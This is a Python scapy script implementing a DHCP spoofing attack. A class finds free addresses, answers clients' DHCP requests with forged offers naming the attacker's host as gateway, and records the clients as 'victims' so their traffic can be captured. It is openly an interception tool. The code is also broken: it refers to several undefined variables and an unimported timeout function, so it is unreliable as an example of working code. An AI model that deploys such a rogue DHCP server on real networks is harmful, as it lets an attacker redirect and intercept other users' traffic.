from scapy.all import *
import socket

DHCP_DISCOVER_TYPE = 1
DHCP_OFFER_TYPE = 2
DHCP_REQUEST_TYPE = 3
DHCP_ACKNOWLEDGE_TYPE = 5
BOOTPC = 68
BOOTPS = 67
BOOTP_REPLY_OP_CODE = 2

class DHCPSpoofing:
    def __init__(self, gateway_ip, gateway_mac, dns_server_ip):
        self.local_ip = None
        self.local_mac = None
        self.subnet_mask = None

        self.gateway = (gateway_ip, gateway_mac)
        self.dns_server = dns_server_ip

        self.socket = conf.L2socket
        self.vacant_ips = []
        self.victims = []
        self.packet_handler = None

    def __find_vacant_ips(self):
        time_to_wait = 1
        count = 2
        ping_packet = IP(src=self.local_ip) / ICMP(type="echo-request") / Raw('abcdefghigklmnopqrstuvwabcdefghi')
        while len(vacant_ips) < ip_count:
            ping_packet[IP].dst = self.subnet_mask + str(count)
            if ping_packet[IP].dst == self.local_ip:
                count += 1
            ping_packet[IP].dst = self.subnet_mask + str(count)
            try:
                func_timeout(time_to_wait, sr1, ping_packet)
            except FunctionTimedOut:
                vacant_ips.append(ping_packet[IP].dst)
            count += 1

    def __offer_packet(self):
        ethernet = Ether(src=MY_COMPUTER_MAC, dst=BROADCAST_MAC)
        ip = IP(src=MY_COMPUTER_IP, dst=BROADCAST_IP)
        udp = UDP(sport=BOOTPS, dport=BOOTPC)
        bootp = BOOTP(op=BOOTP_REPLY_OP_CODE, xid=packet[BOOTP].xid, yiaddr=victim_ip_offer,
                      siaddr=MY_COMPUTER_IP,
                      chaddr=packet[BOOTP].chaddr, sname=packet[BOOTP].sname, file=
                      packet[BOOTP].file,
                      options=packet[BOOTP].options)
        dhcp = DHCP(options=[
            ('message-type', DHCP_OFFER_TYPE), ('subnet_mask', '255.255.255.0'),
            ('time_zone', b'\x00\x00\x00\x00'),
            ('router', self.local_ip), ('default_ttl', b'@'), ('lease_time', 3600),
            ('server_id', self.local_ip),
            ('renewal_time', 1800), ('rebinding_time', 3150),
            ('name_server', self.dns_server), 'end', 'pad'])

        return  ethernet / ip / udp / bootp / dhcp

    def __acknowledgement_packet(self):
        ip_offer = self.vacant_ips[len(self.vacant_ips) - 1]
        ethernet = Ether(src=MY_COMPUTER_MAC, dst=BROADCAST_MAC)
        ip = IP(src=MY_COMPUTER_IP, dst=BROADCAST_IP)
        udp = UDP(sport=BOOTPS, dport=BOOTPC)
        bootp = BOOTP(op=BOOTP_REPLY_OP_CODE, xid=packet[BOOTP].xid,
                      yiaddr=victim_ip_offer, siaddr=MY_COMPUTER_IP,
                      chaddr=packet[BOOTP].chaddr, sname=packet[BOOTP].sname,
                      file=packet[BOOTP].file,
                      options=packet[BOOTP].options)
        dhcp = DHCP(options=[
            ('message-type', DHCP_ACKNOWLEDGE_TYPE),
            ('subnet_mask', '255.255.255.0'),
            ('time_zone', b'\x00\x00\x00\x00'),
            ('router', MY_COMPUTER_IP), ('default_ttl', b'@'), ('lease_time', 3600),
            ('server_id', MY_COMPUTER_IP),
            ('renewal_time', 1800), ('rebinding_time', 3150),
            ('name_server', DNS_SERVER_IP), 'end', 'pad'])

        self.vacant_ips.remove(self.vacant_ips[len(self.vacant_ips) - 1])
        self.victims.append(ip_offer)
        return ethernet / ip / udp / bootp / dhcp

    def __response_packet(self, packet):
        if DHCP not in packet:
            if self.packet_handler:
                self.packet_handler(packet)
        else:
            response_packet = None
            if packet[DHCP].options[0][1] == DHCP_DISCOVER_TYPE:
                response_packet = self.__offer_packet()
            elif packet[DHCP].options[0][1] == DHCP_REQUEST_TYPE:
                response_packet = self.__acknowledgement_packet()

            sendp(response_packet)

    def __filter_func(self, packet):
        if len(self.vacant_ips) <= 0:
            return False

        is_dhcp_packet = (DHCP in packet) and (packet[DHCP].options[0][1] in (DHCP_DISCOVER_TYPE, DHCP_REQUEST_TYPE))
        victim_packet = (IP in packet) and (packet[IP].src in victim_ips)

        return is_dhcp_packet or victim_packet

    def run(self, packets_handler=None):
        self.packet_handler = packets_handler
        self.__find_vacant_ips()
        sniff(lfilter=self.__filter_func, prn=self.__response_packet)